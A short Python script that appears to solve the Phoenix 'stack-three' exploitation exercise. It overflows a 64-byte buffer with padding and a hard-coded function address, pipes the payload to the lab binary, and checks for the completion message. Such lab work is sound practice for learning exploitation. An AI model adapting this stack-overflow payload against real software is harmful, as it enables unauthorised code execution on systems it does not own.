from subprocess import Popen, PIPE


FILE_PATH = "/opt/phoenix/i486/stack-three"

func_pointer = bytearray.fromhex("08048535")[::-1]
padding = ("A" * 64).encode()
payload = padding + func_pointer

p = Popen(FILE_PATH, stdin=PIPE, stdout=PIPE, stderr=PIPE)
reply = p.communicate(payload)[0].decode()
assert "Congratulations, you've finished phoenix/stack-three :-) Well done!" in reply
print("Success!")

